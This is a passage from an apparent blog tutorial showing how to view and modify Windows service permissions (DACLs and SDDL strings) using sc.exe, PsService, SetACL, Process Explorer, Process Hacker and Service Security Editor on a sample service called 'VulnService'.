</span></span><span class="line"><span class="cl">  <span class="n">OWNER</span><span class="err">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mf">0</span><span class="p">]</span> <span class="n">ACCESS_ALLOWED_ACE_TYPE</span><span class="err">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_STATUS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_CONFIG</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_INTERROGATE</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ENUMERATE_DEPENDENTS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_PAUSE_CONTINUE</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_STOP</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_USER_DEFINED_CONTROL</span>
</span></span><span class="line"><span class="cl">        <span class="n">READ_CONTROL</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mf">1</span><span class="p">]</span> <span class="n">ACCESS_ALLOWED_ACE_TYPE</span><span class="err">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ALL_ACCESS</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mf">2</span><span class="p">]</span> <span class="n">ACCESS_ALLOWED_ACE_TYPE</span><span class="err">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">INTERACTIVE</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_STATUS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_CONFIG</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_INTERROGATE</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ENUMERATE_DEPENDENTS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_USER_DEFINED_CONTROL</span>
</span></span><span class="line"><span class="cl">        <span class="n">READ_CONTROL</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mf">3</span><span class="p">]</span> <span class="n">ACCESS_ALLOWED_ACE_TYPE</span><span class="err">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SERVICE</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_STATUS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_CONFIG</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_INTERROGATE</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ENUMERATE_DEPENDENTS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_USER_DEFINED_CONTROL</span>
</span></span><span class="line"><span class="cl">        <span class="n">READ_CONTROL</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above output is a representation of the SDDL (security descriptor).</p>
<h3 id="sysinternals-psservice">SysInternals PsService</h3>
<p>Query the service permissions using PsService.exe or PsService64.exe, and run this command from an <strong>administrator</strong> command prompt:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">psservice</span><span class="p">.</span><span class="py">exe</span> <span class="n">security</span> <span class="s2">&#34;VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">PsService</span> <span class="n">v2</span><span class="p">.</span><span class="py">25</span> <span class="p">-</span> <span class="n">Service</span> <span class="n">information</span> <span class="n">and</span> <span class="kd">configuration</span><span class="w"> </span><span class="nb">utility
</span></span></span><span class="line"><span class="cl"><span class="nb"></span><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="mf">2001</span><span class="p">-</span><span class="mf">2010</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl"><span class="n">DISPLAY_NAME</span><span class="err">:</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="n">ACCOUNT</span><span class="err">:</span> <span class="n">LocalSystem</span>
</span></span><span class="line"><span class="cl">        <span class="n">SECURITY</span><span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="no">ALLOW</span><span class="p">]</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</span></span><span class="line"><span class="cl">                <span class="n">Query</span> <span class="n">status</span>
</span></span><span class="line"><span class="cl">                <span class="n">Query</span> <span class="n">Config</span>
</span></span><span class="line"><span class="cl">                <span class="n">Interrogate</span>
</span></span><span class="line"><span class="cl">                <span class="n">Enumerate</span> <span class="n">Dependents</span>
</span></span><span class="line"><span class="cl">                <span class="n">Pause</span><span class="p">/</span><span class="n">Resume</span>
</span></span><span class="line"><span class="cl">                <span class="nb">Start
</span></span></span><span class="line"><span class="cl"><span class="nb"></span>                <span class="n">Stop</span>
</span></span><span class="line"><span class="cl">                <span class="nb">User-Defined</span> <span class="n">Control</span>
</span></span><span class="line"><span class="cl">                <span class="n">Read</span> <span class="n">Permissions</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="no">ALLOW</span><span class="p">]</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
</span></span><span class="line"><span class="cl">                <span class="n">All</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="no">ALLOW</span><span class="p">]</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">INTERACTIVE</span>
</span></span><span class="line"><span class="cl">                <span class="n">Query</span> <span class="n">status</span>
</span></span><span class="line"><span class="cl">                <span class="n">Query</span> <span class="n">Config</span>
</span></span><span class="line"><span class="cl">                <span class="n">Interrogate</span>
</span></span><span class="line"><span class="cl">                <span class="n">Enumerate</span> <span class="n">Dependents</span>
</span></span><span class="line"><span class="cl">                <span class="nb">User-Defined</span> <span class="n">Control</span>
</span></span><span class="line"><span class="cl">                <span class="n">Read</span> <span class="n">Permissions</span>
</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="no">ALLOW</span><span class="p">]</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SERVICE</span>
</span></span><span class="line"><span class="cl">                <span class="n">Query</span> <span class="n">status</span>
</span></span><span class="line"><span class="cl">                <span class="n">Query</span> <span class="n">Config</span>
</span></span><span class="line"><span class="cl">                <span class="n">Interrogate</span>
</span></span><span class="line"><span class="cl">                <span class="n">Enumerate</span> <span class="n">Dependents</span>
</span></span><span class="line"><span class="cl">                <span class="nb">User-Defined</span> <span class="n">Control</span>
</span></span><span class="line"><span class="cl">                <span class="n">Read</span> <span class="n">Permissions</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see above, the output generated by AccessChk and PsService utilities is very friendly.</p>
<h3 id="setaclexe">SetACL.exe</h3>
<p>The <a href="https://helgeklein.com/setacl/" target="_blank" rel="noopener noreffer ">SetACL.exe</a> command-line application (by Helge Klein) is a fantastic command-line tool for automating permissions in Windows. SetACL allows us to alter and inspect ownership and permissions for the file system, registry, printers, network shares, and services, among other things. We can download it <a href="https://helgeklein.com/download/#" target="_blank" rel="noopener noreffer ">here</a>.</p>
<p>View the permissions of a service (e.g., VulnService service), run this command from a command-prompt running as <strong>administrator</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="mf">64</span> <span class="n">bit</span><span class="p">&gt;.\</span><span class="n">SetACL</span><span class="p">.</span><span class="py">exe</span> <span class="n">-on</span> <span class="s2">&#34;VulnService&#34;</span> <span class="n">-ot</span> <span class="n">srv</span> <span class="n">-actn</span> <span class="n">list</span>
</span></span><span class="line"><span class="cl"><span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="n">DACL</span><span class="p">(</span><span class="n">not_protected</span><span class="p">)</span><span class="err">:</span>
</span></span><span class="line"><span class="cl">   <span class="n">SYSTEM</span>   <span class="n">start_stop</span>   <span class="n">allow</span>   <span class="n">no_inheritance</span>
</span></span><span class="line"><span class="cl">   <span class="n">Administrators</span>   <span class="n">full</span>   <span class="n">allow</span>   <span class="n">no_inheritance</span>
</span></span><span class="line"><span class="cl">   <span class="n">INTERACTIVE</span>   <span class="n">read</span>   <span class="n">allow</span>   <span class="n">no_inheritance</span>
</span></span><span class="line"><span class="cl">   <span class="n">SERVICE</span>   <span class="n">read</span>   <span class="n">allow</span>   <span class="n">no_inheritance</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SetACL</span> <span class="n">finished</span> <span class="n">successfully</span><span class="p">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ul>
<li><code>-on</code> : ObjectName</li>
<li><code>-ot</code> : ObjectType</li>
<li><code>-actn</code> : Action to take</li>
</ul>
<p>We can also view the SDDL format:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="mf">64</span> <span class="n">bit</span><span class="p">&gt;.\</span><span class="n">SetACL</span><span class="p">.</span><span class="py">exe</span> <span class="n">-on</span> <span class="s2">&#34;VulnService&#34;</span> <span class="n">-ot</span> <span class="n">srv</span> <span class="n">-actn</span> <span class="n">list</span> <span class="n">-lst</span> <span class="s2">&#34;f:sddl&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;VulnService&#34;</span><span class="p">,</span><span class="mf">2</span><span class="p">,</span><span class="s2">&#34;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SetACL</span> <span class="n">finished</span> <span class="n">successfully</span><span class="p">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="sysinternals-process-explorer">Sysinternals Process Explorer</h3>
<p>The Process Explorer tool from Windows Sysinternals can also be used to view and edit service permissions:</p>
<figure><a class="lightgallery" href="/images/posts/process-explorer.png" title="/images/posts/process-explorer.png" data-thumbnail="/images/posts/process-explorer.png" data-sub-html="<h2>Process Explorer</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/process-explorer.png"
            data-srcset="/images/posts/process-explorer.png, /images/posts/process-explorer.png 1.5x, /images/posts/process-explorer.png 2x"
            data-sizes="auto"
            alt="/images/posts/process-explorer.png" />
    </a><figcaption class="image-caption">Process Explorer</figcaption>
    </figure>
<p>Discretionary Access Control Lists:</p>
<figure><a class="lightgallery" href="/images/posts/process-explorer-service-dacl.png" title="/images/posts/process-explorer-service-dacl.png" data-thumbnail="/images/posts/process-explorer-service-dacl.png" data-sub-html="<h2>Process Explorer DACL</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/process-explorer-service-dacl.png"
            data-srcset="/images/posts/process-explorer-service-dacl.png, /images/posts/process-explorer-service-dacl.png 1.5x, /images/posts/process-explorer-service-dacl.png 2x"
            data-sizes="auto"
            alt="/images/posts/process-explorer-service-dacl.png" />
    </a><figcaption class="image-caption">Process Explorer DACL</figcaption>
    </figure>
<h3 id="process-hacker">Process Hacker</h3>
<p>The Process Hacker tool can also be used to view and edit service permissions:</p>
<figure><a class="lightgallery" href="/images/posts/process-hacker-service-dacl.png" title="/images/posts/process-hacker-service-dacl.png" data-thumbnail="/images/posts/process-hacker-service-dacl.png" data-sub-html="<h2>Process Hacker</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/process-hacker-service-dacl.png"
            data-srcset="/images/posts/process-hacker-service-dacl.png, /images/posts/process-hacker-service-dacl.png 1.5x, /images/posts/process-hacker-service-dacl.png 2x"
            data-sizes="auto"
            alt="/images/posts/process-hacker-service-dacl.png" />
    </a><figcaption class="image-caption">Process Hacker</figcaption>
    </figure>
<h3 id="service-security-editor">Service Security Editor</h3>
<p>The <a href="https://www.coretechnologies.com/products/ServiceSecurityEditor/" target="_blank" rel="noopener noreffer ">Service Security Editor</a> utility is a third-party freeware that let&rsquo;s us view configure service permissions very easily:</p>
<figure><a class="lightgallery" href="/images/posts/service-security-editor.png" title="/images/posts/service-security-editor.png" data-thumbnail="/images/posts/service-security-editor.png" data-sub-html="<h2>Service Security Editor</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/service-security-editor.png"
            data-srcset="/images/posts/service-security-editor.png, /images/posts/service-security-editor.png 1.5x, /images/posts/service-security-editor.png 2x"
            data-sizes="auto"
            alt="/images/posts/service-security-editor.png" />
    </a><figcaption class="image-caption">Service Security Editor</figcaption>
    </figure>
<p>When can click on the <code>Open...</code> button and view or modify the permissions of the selected service:</p>
<figure><a class="lightgallery" href="/images/posts/service-security-editor-open.png" title="/images/posts/service-security-editor-open.png" data-thumbnail="/images/posts/service-security-editor-open.png" data-sub-html="<h2>Service Security Editor Open</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/service-security-editor-open.png"
            data-srcset="/images/posts/service-security-editor-open.png, /images/posts/service-security-editor-open.png 1.5x, /images/posts/service-security-editor-open.png 2x"
            data-sizes="auto"
            alt="/images/posts/service-security-editor-open.png" />
    </a><figcaption class="image-caption">Service Security Editor Open</figcaption>
    </figure>
<h2 id="modify-service-permissions">Modify service permissions</h2>
<p>We can modify the service permissions in multiple ways. Let’s see a few methods.</p>
<h3 id="scexe-1">SC.exe</h3>
<p>We can modify the permissions of a service with the <code>sc.exe sdset</code> command-line argument. We can give to the administrators full control permissions for a service, we’d use this SDDL string:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">D:</span><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWLORC</span><span class="p">;;;</span><span class="n">AU</span><span class="p">)(</span><span class="n">A</span><span class="p">;;**</span><span class="n">CCDCLCSWRPWPDTLOCRSDRCWDWO</span><span class="p">**;;;</span><span class="n">BA</span><span class="p">)(</span><span class="n">A</span><span class="p">;;**</span><span class="n">CCDCLCSWRPWPDTLOCRSDRCWDWO</span><span class="p">**;;;</span><span class="n">SY</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWLORC</span><span class="p">;;;</span><span class="n">BU</span><span class="p">)</span><span class="n">S:</span><span class="p">(</span><span class="n">AU</span><span class="p">;</span><span class="n">FA</span><span class="p">;</span><span class="n">CCDCLCSWRPWPDTLOCRSDRCWDWO</span><span class="p">;;;</span><span class="n">WD</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can apply this SDDL for the <code>VulnService</code> service from an <strong>administrator</strong> command prompt window:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="mf">64</span> <span class="n">bit</span><span class="p">&gt;</span><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">sdset</span> <span class="s2">&#34;VulnService&#34;</span> <span class="n">D:</span><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWLORC</span><span class="p">;;;</span><span class="n">AU</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCDCLCSWRPWPDTLOCRSDRCWDWO</span><span class="p">;;;</span><span class="n">BA</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCDCLCSWRPWPDTLOCRSDRCWDWO</span><span class="p">;;;</span><span class="n">SY</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWLORC</span><span class="p">;;;</span><span class="n">BU</span><span class="p">)</span><span class="n">S:</span><span class="p">(</span><span class="n">AU</span><span class="p">;</span><span class="n">FA</span><span class="p">;</span><span class="n">CCDCLCSWRPWPDTLOCRSDRCWDWO</span><span class="p">;;;</span><span class="n">WD</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">SetServiceObjectSecurity</span> <span class="n">SUCCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We should get the message <code>[SC] SetServiceObjectSecurity SUCCESS</code> in the output as we can see above. Now, the <strong>Administrators</strong> group can start, stop, query, change the configuration, or even delete the service.</p>
<p>The service status buttons and the startup type options in <code>VulnService</code> properties are now available for the Administrators:</p>
<figure><a class="lightgallery" href="/images/posts/services-vulnservice-buttons.png" title="/images/posts/services-vulnservice-buttons.png" data-thumbnail="/images/posts/services-vulnservice-buttons.png" data-sub-html="<h2>Service Buttons</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/services-vulnservice-buttons.png"
            data-srcset="/images/posts/services-vulnservice-buttons.png, /images/posts/services-vulnservice-buttons.png 1.5x, /images/posts/services-vulnservice-buttons.png 2x"
            data-sizes="auto"
            alt="/images/posts/services-vulnservice-buttons.png" />
    </a><figcaption class="image-caption">Service Buttons</figcaption>
    </figure>
<h3 id="process-explorer">Process Explorer</h3>
<p>If the service is currently running, we can use the <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer" target="_blank" rel="noopener noreffer ">Process Explorer</a> tool to modify the service permissions.</p>
<p>We&rsquo;ll launch <strong>Process Explorer</strong> as administrator and then double-click the <code>VulnService.exe</code> process:</p>
<figure><a class="lightgallery" href="/images/posts/process-explorer-edit-1.png" title="/images/posts/process-explorer-edit-1.png" data-thumbnail="/images/posts/process-explorer-edit-1.png" data-sub-html="<h2>Process Explorer Edit Service</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/process-explorer-edit-1.png"
            data-srcset="/images/posts/process-explorer-edit-1.png, /images/posts/process-explorer-edit-1.png 1.5x, /images/posts/process-explorer-edit-1.png 2x"
            data-sizes="auto"
            alt="/images/posts/process-explorer-edit-1.png" />
    </a><figcaption class="image-caption">Process Explorer Edit Service</figcaption>
    </figure>
<p>Go to the <strong>Services</strong> tab and click on the <strong>Permissions</strong> button:</p>
<figure><a class="lightgallery" href="/images/posts/process-explorer-edit-2.png" title="/images/posts/process-explorer-edit-2.png" data-thumbnail="/images/posts/process-explorer-edit-2.png" data-sub-html="<h2>Process Explorer Edit Service</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/process-explorer-edit-2.png"
            data-srcset="/images/posts/process-explorer-edit-2.png, /images/posts/process-explorer-edit-2.png 1.5x, /images/posts/process-explorer-edit-2.png 2x"
            data-sizes="auto"
            alt="/images/posts/process-explorer-edit-2.png" />
    </a><figcaption class="image-caption">Process Explorer Edit Service</figcaption>
    </figure>
<p>Now in the Permissions dialog click <strong>Advanced</strong>:</p>
<figure><a class="lightgallery" href="/images/posts/process-explorer-edit-3.png" title="/images/posts/process-explorer-edit-3.png" data-thumbnail="/images/posts/process-explorer-edit-3.png" data-sub-html="<h2>Process Explorer Edit Service</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/process-explorer-edit-3.png"
            data-srcset="/images/posts/process-explorer-edit-3.png, /images/posts/process-explorer-edit-3.png 1.5x, /images/posts/process-explorer-edit-3.png 2x"
            data-sizes="auto"
            alt="/images/posts/process-explorer-edit-3.png" />
    </a><figcaption class="image-caption">Process Explorer Edit Service</figcaption>
    </figure>
<p>Select Administrators and click <strong>Edit</strong>:</p>
<figure><a class="lightgallery" href="/images/posts/process-explorer-edit-4.png" title="/images/posts/process-explorer-edit-4.png" data-thumbnail="/images/posts/process-explorer-edit-4.png" data-sub-html="<h2>Process Explorer Edit Service</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/process-explorer-edit-4.png"
            data-srcset="/images/posts/process-explorer-edit-4.png, /images/posts/process-explorer-edit-4.png 1.5x, /images/posts/process-explorer-edit-4.png 2x"
            data-sizes="auto"
            alt="/images/posts/process-explorer-edit-4.png" />
    </a><figcaption class="image-caption">Process Explorer Edit Service</figcaption>
    </figure>
<p>In the Permission Entry dialog there are two options:</p>
<ul>
<li>
<p>Basic Permissions: Grouped permissions / simplified permissions</p>
</li>
<li>
<p>Advanced Permissions: Each permission separately</p>
</li>
</ul>
<p>These is the view of the advanced permissions:</p>
<figure><a class="lightgallery" href="/images/posts/process-explorer-edit-5.png" title="/images/posts/process-explorer-edit-5.png" data-thumbnail="/images/posts/process-explorer-edit-5.png" data-sub-html="<h2>Process Explorer Edit Service</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/process-explorer-edit-5.png"
            data-srcset="/images/posts/process-explorer-edit-5.png, /images/posts/process-explorer-edit-5.png 1.5x, /images/posts/process-explorer-edit-5.png 2x"
            data-sizes="auto"
            alt="/images/posts/process-explorer-edit-5.png" />
    </a><figcaption class="image-caption">Process Explorer Edit Service</figcaption>
    </figure>
<h3 id="process-hacker-1">Process Hacker</h3>
<p>The Process Hacker tool can also be used to view and edit service permissions:</p>
<figure><a class="lightgallery" href="/images/posts/process-hacker-service-dacl.png" title="/images/posts/process-hacker-service-dacl.png" data-thumbnail="/images/posts/process-hacker-service-dacl.png" data-sub-html="<h2>Process Explorer Edit Service</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/process-hacker-service-dacl.png"
            data-srcset="/images/posts/process-hacker-service-dacl.png, /images/posts/process-hacker-service-dacl.png 1.5x, /images/posts/process-hacker-service-dacl.png 2x"
            data-sizes="auto"
            alt="/images/posts/process-hacker-service-dacl.png" />
    </a><figcaption class="image-caption">Process Explorer Edit Service</figcaption>
    </figure>
<h3 id="service-security-editor-1">Service Security Editor</h3>
<p>The <strong>Service Security Editor</strong> (ServiceSecurityEditor.exe), is a digitally signed executable from Core Technologies Consulting, LLC, which can be used to view and set permissions for any Windows service. We can download this program from <a href="https://www.coretechnologies.com/products/ServiceSecurityEditor/" target="_blank" rel="noopener noreffer ">here</a>.</p>
<p>Select the service from the list and click on the <code>Open…</code> button:</p>
<figure><a class="lightgallery" href="/images/posts/service-security-editor-1.png" title="/images/posts/service-security-editor-1.png" data-thumbnail="/images/posts/service-security-editor-1.png" data-sub-html="<h2>Process Explorer Edit Service</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/service-security-editor-1.png"
            data-srcset="/images/posts/service-security-editor-1.png, /images/posts/service-security-editor-1.png 1.5x, /images/posts/service-security-editor-1.png 2x"
            data-sizes="auto"
            alt="/images/posts/service-security-editor-1.png" />
    </a><figcaption class="image-caption">Process Explorer Edit Service</figcaption>
    </figure>
<p>This opens the Security settings dialog where we can set the permissions for the chosen service:</p>
<figure><a class="lightgallery" href="/images/posts/service-security-editor-settings-2.png" title="/images/posts/service-security-editor-settings-2.png" data-thumbnail="/images/posts/service-security-editor-settings-2.png" data-sub-html="<h2>Process Explorer Edit Service</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/images/posts/service-security-editor-settings-2.png"
            data-srcset="/images/posts/service-security-editor-settings-2.png, /images/posts/service-security-editor-settings-2.png 1.5x, /images/posts/service-security-editor-settings-2.png 2x"
            data-sizes="auto"
            alt="/images/posts/service-security-editor-settings-2.png" />
    </a><figcaption class="image-caption">Process Explorer Edit Service</figcaption>
    </figure>
<p>Then we can click <strong>OK</strong> and click <strong>Done</strong> to save our settings.</p>
<h3 id="setaclexe-1">SetACL.exe</h3>
<p>The <a href="https://helgeklein.com/setacl/" target="_blank" rel="noopener noreffer ">SetACL.exe</a> command-line application (by Helge Klein) is a fantastic command-line tool for automating permissions in Windows. SetACL allows us to alter and inspect ownership and permissions for the file system, registry, printers, network shares, and services, among other things. We can download it <a href="https://helgeklein.com/download/#" target="_blank" rel="noopener noreffer ">here</a>.</p>
<blockquote>
<p>Note: If we need to assign granular permissions (e.g., grant <code>SERVICE_START</code> but not <code>SERVICE_STOP</code>, or the other way around) for a user or group, then SetACL is not our best option. We can use one of the other methods described before.</p>
</blockquote>
<p>We can edit the permissions of a service (e.g., VulnService service), and run this command from a command-prompt running as <strong>administrator</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="mf">64</span> <span class="n">bit</span><span class="p">&gt;</span><span class="n">SetACL</span><span class="p">.</span><span class="py">exe</span> <span class="n">-on</span> <span class="s2">&#34;VulnService&#34;</span> <span class="n">-ot</span> <span class="n">srv</span> <span class="n">-actn</span> <span class="n">ace</span> <span class="n">-ace</span> <span class="s2">&#34;n:administrators;p:full&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">Processing</span> <span class="n">ACL</span> <span class="n">of</span><span class="err">:</span> <span class="p">&lt;</span><span class="n">VulnService</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SetACL</span> <span class="n">finished</span> <span class="n">successfully</span><span class="p">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>These are the description of the options used:</p>
<ul>
<li><code>-on</code>: Object Name</li>
<li><code>-ot</code>: Object Type</li>
<li><code>-actn</code>: Action to take</li>
<li><code>-ace</code>: Set permissions/ACE</li>
<li><code>n</code>: Principal (Account or group name)</li>
<li><code>p</code>: Permissions</li>
<li><code>full</code>: full control permissions. This means <code>SERVICE_ALL_ACCESS</code>.</li>
</ul>
<blockquote>
<p>Note: We can view a complete list of the command-line switches atthe official <a href="https://helgeklein.com/setacl/documentation/command-line-version-setacl-exe/" target="_blank" rel="noopener noreffer ">SetACL.exe documentation</a> at Helge’s site.</p>
</blockquote>
<p>SetACL supports only three permissions levels, which are <code>read</code>, <code>start_stop</code>, and <code>full</code>. These are the details about each permission level:</p>
<p><strong>read</strong></p>
<ul>
